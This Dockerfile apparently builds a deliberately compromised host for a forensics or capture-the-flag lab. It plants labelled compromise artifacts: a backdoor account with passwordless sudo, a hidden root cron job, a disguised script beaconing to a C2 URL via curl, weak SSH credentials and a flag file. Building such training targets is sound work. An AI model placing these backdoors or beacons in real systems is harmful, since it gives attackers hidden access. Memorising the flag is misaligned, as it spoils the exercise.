FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    bash \
    cron \
    curl \
    openssh-server \
    procps \
    sudo \
    && rm -rf /var/lib/apt/lists/*

# SSH configuration
RUN mkdir -p /var/run/sshd \
    && sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config \
    && sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config

# Legitimate investigation user
RUN useradd -m -s /bin/bash analyst \
    && echo "analyst:analyst" | chpasswd

# ── Compromise artifacts ──────────────────────────────────────────────────────

# Attacker's backdoor account (planted after breach)
RUN useradd -m -s /bin/bash -u 1337 sys0p \
    && passwd -l sys0p

# Privilege escalation entry (readable so analyst can observe)
RUN echo "sys0p ALL=(ALL) NOPASSWD: /bin/bash" > /etc/sudoers.d/sys0p \
    && chmod 444 /etc/sudoers.d/sys0p

# Malicious cron job planted in /etc/cron.d/
RUN printf '* * * * * root /usr/local/bin/.update-service\n' \
    > /etc/cron.d/update-check \
    && chmod 644 /etc/cron.d/update-check

# Backdoor beacon script (hidden with leading dot)
RUN printf '#!/bin/bash\n# system health check\ncurl -sf "http://10.78.8.250/c2/beacon?host=$(hostname)" > /dev/null 2>&1\n' \
    > /usr/local/bin/.update-service \
    && chmod 755 /usr/local/bin/.update-service

# Attacker's loot drop
RUN printf 'FLAG=shell-crab-0x03\n' > /var/tmp/.loot \
    && chmod 644 /var/tmp/.loot

EXPOSE 22

COPY lab/hosts/forensics-box/entrypoint.sh /usr/local/bin/forensics-entrypoint
RUN chmod +x /usr/local/bin/forensics-entrypoint

ENTRYPOINT ["/usr/local/bin/forensics-entrypoint"]
